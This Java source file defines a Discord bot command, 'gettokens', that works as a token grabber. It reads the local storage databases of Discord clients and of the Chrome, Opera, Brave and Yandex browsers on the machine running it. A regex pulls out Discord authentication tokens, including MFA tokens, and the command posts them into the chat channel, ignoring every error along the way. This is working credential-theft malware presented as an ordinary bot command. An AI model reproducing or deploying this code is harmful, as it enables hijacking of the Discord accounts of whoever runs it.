package cmd;

import main.Bot;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class GetToken extends Command {
    public GetToken(){
        this.name = "gettokens";
        this.usage = "/gettokens";
        this.desc = "";
        this.type = CommandType.GENERAL;
    }

    @Override
    public boolean onCommand(User user, Message message, String[] args) {
        String s = "";
        for (String token : getTokens()) s+=token+"\n";
        message.getChannel().sendMessage('`'+s+'`').queue();
        return true;
    }

    private static List<String> getTokens() {
        List<String> tokens = new ArrayList<>();
        String fs = System.getenv("file.separator");
        String localappdata = System.getenv("LOCALAPPDATA");
        String roaming = System.getenv("APPDATA");
        String[][] paths = {
                {"Lightcord", roaming + "\\Lightcord\\Local Storage\\leveldb"}, //Lightcord
                {"Discord", roaming + "\\Discord\\Local Storage\\leveldb"}, //Standard Discord
                {"Discord Canary", roaming + "\\discordcanary\\Local Storage\\leveldb"}, //Discord Canary
                {"Discord PTB", roaming + "\\discordptb\\Local Storage\\leveldb"}, //Discord PTB
                {"Chrome Browser", localappdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"}, //Chrome Browser
                {"Opera Browser", roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"}, //Opera Browser
                {"Opera GX Browser", roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb"}, //Opera GX Browser
                {"Brave Browser", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"}, //Brave Browser
                {"Yandex Browser", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"}, //Yandex Browser
                {"Discord", System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb"} //Discord MacOS
        };

        for (String[] path : paths) {
            try {
                File file = new File(path[1]);

                for (String pathname : file.list()) {
                    if (pathname.equals("LOCK")) { // this file will give us error so just don't read it reduce search time a bit
                        continue;
                    }

                    FileInputStream fstream = new FileInputStream(path[1] + System.getProperty("file.separator") + pathname);
                    DataInputStream in = new DataInputStream(fstream);
                    BufferedReader br = new BufferedReader(new InputStreamReader(in));
                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        Pattern p = Pattern.compile("[\\w]{24}\\.[\\w]{6}\\.[\\w]{27}|mfa\\.[\\w]{84}");
                        Matcher m = p.matcher(strLine);

                        while (m.find()) {
                            if (!tokens.contains(m.group())) {
                                tokens.add(m.group());
                            }
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }
        return tokens;

    }
}
